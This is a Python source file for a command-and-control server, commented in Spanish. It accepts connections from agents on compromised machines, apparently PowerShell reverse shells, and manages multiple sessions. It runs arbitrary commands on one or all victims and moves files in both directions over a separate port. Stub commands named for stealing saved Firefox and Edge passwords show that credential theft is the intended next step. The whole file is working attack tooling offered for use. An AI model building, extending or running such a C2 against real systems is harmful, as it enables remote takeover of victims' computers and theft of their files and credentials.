#!/usr/bin/env python3
import socket
import struct
import threading
import re
import shlex
import os
from tqdm import tqdm

IP   = "192.168.100.138"
PORT = 443
FILE_TRANSFER_PORT = 444

# ==================== COLORES ====================
# =================================================

# colores ANSI
RESET   = "\033[0m"
CYAN    = "\033[96m"
GREEN   = "\033[92m"
YELLOW  = "\033[93m"
MAGENTA = "\033[95m"
RED     = "\033[91m"
BOLD    = "\033[1m"

# patrones para colorear el output
DIR_LINE  = re.compile(r"^(d[-a-z]+)\s+")   # líneas de directorio (Mode)
FILE_LINE = re.compile(r"^(-[-a-z]+)\s+")   # líneas de archivo

def colorize_output(line: str) -> str:
    """Colorea cada línea del output según su contenido."""
    if DIR_LINE.match(line):
        return f"{MAGENTA}{line}{RESET}"
    if FILE_LINE.match(line):
        return f"{YELLOW}{line}{RESET}"
    if re.match(r"^(Mode|----)", line):
        return f"{CYAN}{line}{RESET}"
    return f"{YELLOW}{line}{RESET}"

# =================== FIN COLORES =================
# =================================================

class Agent:
    def __init__(self, client_socket, address, session_id):
        self.client_socket = client_socket   # socket propio
        self.address       = address
        self.session_id    = session_id
        self.current_path  = ""
        self._output_done  = threading.Event()
        self._output_done.set()

    def _recv_exact(self, n: int) -> bytes:
        buf = b""
        while len(buf) < n:
            chunk = self.client_socket.recv(n - len(buf))
            if not chunk:
                raise ConnectionError("Client disconnected")
            buf += chunk
        return buf

    def _receiver(self):
        while True:
            try:
                raw_len = self._recv_exact(4)
                msg_len = struct.unpack(">I", raw_len)[0]
                data    = self._recv_exact(msg_len)

                if data == b"<CMD_DONE>":
                    self._output_done.set()
                    continue

                lines          = data.split(b"\n")
                lines_filtered = []

                for l in lines:
                    l = l.rstrip(b"\r")

                    if b"<CMD_DONE>" in l:
                        continue

                    if l.startswith(b"PS "):
                        continue

                    path_match = re.search(rb"^PATH:(.+)$", l)
                    if path_match:
                        self.current_path = path_match.group(1).decode("cp850", errors="replace").strip()
                        continue

                    lines_filtered.append(l)

                data = b"\n".join(lines_filtered)

                if not data.strip():
                    continue

                self._output_done.clear()

                decoded = data.decode("cp850", errors="replace").replace("┬", "")
                colored = "\n".join(colorize_output(l) for l in decoded.splitlines())
                print(colored, end="\n", flush=True)

            except (ConnectionError, OSError):
                self._output_done.set()
                print(f"\n{RED}[!] Cliente desconectado{RESET}")
                if self.client_socket:
                    self.client_socket.close()
                break

    def send_command(self, cmd: str):
        payload = (cmd + "\n").encode("utf-8")
        header  = struct.pack(">I", len(payload))
        self.client_socket.sendall(header + payload)

    def interact(self):
        #Arranca la interaccion con la terminal de la session correspondiente.
        t = threading.Thread(target=self._receiver, daemon=True)
        t.start()

# ==================================================================================================================================
# ==================================================================================================================================
# ==================================================================================================================================

class Listener:
    def __init__(self):
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_socket.bind((IP, PORT))
        self.server_socket.listen()

        self.agents          = {}    # {session_id: Agent}
        self.active_agent    = None
        self.session_actual = 0
        
        self.custom_commands = {
            "get firefox": self.get_firefox_passwords,
            "get edge": self.get_edge_passwords,
            "download": self.download_files,
            "upload": self.upload_files,
        }
    
    def upload_files(self, agent, files):
        transfer_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        transfer_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        transfer_socket.bind((IP, FILE_TRANSFER_PORT))
        transfer_socket.listen()
        
        agent.send_command("upload " + " ".join(files))
        
        transfer_socket.settimeout(10) # tiempo maximo para operaciones bloqueantes (no limita tiempo de transferencia por el socket)
        
        try:
            conn, addr = transfer_socket.accept()
        except TimeoutError:
            print(f"{RED}[!] El cliente no conectó para transferencia{RESET}")
            transfer_socket.close()
            return

        for file in files:
            file_complete_path = os.getcwd() + "/" + file

            if os.path.exists(file_complete_path) and os.path.isfile(file_complete_path):
                size = os.path.getsize(file_complete_path)
                conn.sendall(struct.pack("Q", size))
                with tqdm(total=size, unit="B", unit_scale=True, desc=file, colour="cyan") as bar:
                    with open(file_complete_path, "rb") as f:
                        while True:
                            chunk = f.read(4096)
                            if not chunk:
                                break
                            conn.sendall(chunk)
                            bar.update(len(chunk))
            else:
                conn.sendall(struct.pack("Q", 0)) # envio 0 para que el server no cuelge
        
        conn.close()
        transfer_socket.close()        

    def download_files(self, agent, files):
        transfer_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        transfer_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        transfer_socket.bind((IP, FILE_TRANSFER_PORT))
        transfer_socket.listen()

        # primero escuchar, DESPUÉS mandar el comando al cliente
        agent.send_command("download " + " ".join(files))
        
        transfer_socket.settimeout(10) # tiempo maximo para operaciones bloqueantes (no limita tiempo de transferencia por el socket)
        
        try:
            conn, addr = transfer_socket.accept()
        except TimeoutError:
            print(f"{RED}[!] El cliente no conectó para transferencia{RESET}")
            transfer_socket.close()
            return
        
        for file in files:
            raw_size = conn.recv(8)
            if not raw_size:
                break
            file_size = struct.unpack("Q", raw_size)[0]
            if file_size == 0:
                print(f"{YELLOW}[!] {file} no existe en el cliente{RESET}")
                continue
            bytes_received = 0
            filename = file.split("\\")[-1].split("/")[-1]
            with open(filename, "wb") as f:
                with tqdm(total=file_size, unit="B", unit_scale=True, desc=filename, colour="green") as bar:
                    while bytes_received < file_size:
                        chunk = conn.recv(min(4096, file_size - bytes_received))
                        if not chunk:
                            break
                        f.write(chunk)
                        bar.update(len(chunk))
                        bytes_received += len(chunk)
            print(f"{GREEN}[+] {filename} descargado ({bytes_received} bytes){RESET}")

        conn.close()
        transfer_socket.close()        

    def get_edge_passwords(self):
        pass

    def get_firefox_passwords(self):
        pass

    def _accept_multiple_clients(self):
        while True:
            try:
                client_socket, address = self.server_socket.accept()
                session_id = self.session_actual
                self.session_actual += 1

                agent = Agent(client_socket, address, session_id)
                agent.interact()
                self.agents[session_id] = agent
                
                print(f"\n{GREEN}[+] Nueva sesión [{session_id}] {address[0]}:{address[1]}{RESET}")
                print(f"{CYAN}escribe 'sessions' para ver todas las sesiones{RESET}")
            except OSError:
                break

    def _print_sessions(self):
        if not self.agents:
            print(f"{YELLOW}[*] No hay sesiones activas{RESET}")
            return
        print(f"\n{BOLD}{'ID':<5} {'IP':<18} {'PORT':<8} {'PATH'}{RESET}")
        print(f"{CYAN}{'─'*55}{RESET}")
        for sid, agent in self.agents.items():
            active = f"{GREEN} ← activo{RESET}" if agent is self.active_agent else ""
            path   = agent.current_path or "desconocido"
            print(f"{sid:<5} {agent.address[0]:<18} {agent.address[1]:<8} {path}{active}")
        print("\n")

    def _broadcast(self, cmd: str):
        if not self.agents:
            print(f"{YELLOW}[*] No hay sesiones activas{RESET}")
            return
        for agent in self.agents.values():
            try:
                agent.send_command(cmd)
            except OSError:
                pass
        print(f"{GREEN}[*] Comando enviado a {len(self.agents)} sesiones{RESET}")



    def run(self):
        # arrancar el loop de accept en background
        t = threading.Thread(target=self._accept_multiple_clients, daemon=True)
        t.start()
 
        print(f"\n{GREEN}[*] C2 iniciado — esperando conexiones en {IP}:{PORT}{RESET}")
        print(f"{CYAN}comandos: sessions | interact <id> | broadcast <cmd> | exit{RESET}\n")
 
        while True:
            try:
                # si hay agente activo usar su prompt, sino prompt genérico
                if self.active_agent:
                    path   = self.active_agent.current_path or ""
                    prompt = f"{CYAN}PS {MAGENTA}{path}{CYAN}>{RESET} "
                else:
                    prompt = f"{CYAN}C2>{RESET} "
 
                # si hay agente activo esperar a que termine el output
                if self.active_agent:
                    self.active_agent._output_done.wait()
                
                print()
                cmd = input(prompt).strip()
 
                if not cmd:
                    continue
 
                # ── comandos de gestión ──────────────────────────────
                if cmd == "sessions":
                    self._print_sessions()
                    continue
 
                if cmd.startswith("interact "):
                    try:
                        sid = int(cmd.split()[1])
                        if sid in self.agents:
                            self.active_agent = self.agents[sid]
                            print(f"{GREEN}[*] Interactuando con sesión {sid} ({self.active_agent.address[0]}){RESET}\n")
                        else:
                            print(f"{RED}[!] Sesión {sid} no existe{RESET}")
                    except (ValueError, IndexError):
                        print(f"{RED}[!] Uso: interact <id>{RESET}")
                    continue
 
                if cmd == "background":
                    self.active_agent = None
                    print(f"{YELLOW}[*] Sesión en background — C2>{RESET}")
                    continue
 
                if cmd.startswith("broadcast "):
                    self._broadcast(cmd[len("broadcast "):])
                    continue
 
                if cmd in ("exit", "quit"):
                    break
 
                # ── comando normal al agente activo ──────────────────
                if not self.active_agent:
                    print(f"{YELLOW}[*] Ninguna sesión activa — usá 'interact <id>'{RESET}")
                    continue
                
                if cmd == "help":
                    print(f"\n{BOLD}comandos de gestión:{RESET}")
                    print(f"\t{CYAN}sessions{RESET}           listar sesiones")
                    print(f"\t{CYAN}interact <id>{RESET}      interactuar con sesión")
                    print(f"\t{CYAN}background{RESET}         dejar sesión en background")
                    print(f"\t{CYAN}broadcast <cmd>{RESET}    ejecutar en todas las sesiones")
                    print(f"\n{BOLD}comandos custom:{RESET}")
                    for name in self.custom_commands:
                        print(f"\t{MAGENTA}{name}{RESET}")
                    print()
                    continue

                if cmd.startswith("download "):
                    if not self.active_agent:
                        print(f"{YELLOW}[*] Ninguna sesión activa{RESET}")
                        continue
                    args = shlex.split(cmd)[1:]
                    threading.Thread(target=self.download_files, args=(self.active_agent, args), daemon=True).start()
                    continue

                if cmd.startswith("upload "):
                    if not self.active_agent:
                        print(f"{YELLOW}[*] Ninguna sesión activa{RESET}")
                        continue
                    args = shlex.split(cmd)[1:]
                    threading.Thread(target=self.upload_files, args=(self.active_agent, args), daemon=True).start()
                    continue
                

                self.active_agent._output_done.clear()
                self.active_agent.send_command(cmd)
 
            except KeyboardInterrupt:
                print(f"\n{YELLOW}[*] Usá 'exit' para salir o 'background' para dejar la sesión activa{RESET}")
                continue


if __name__ == "__main__":
    my_listener = Listener()
    my_listener.run()
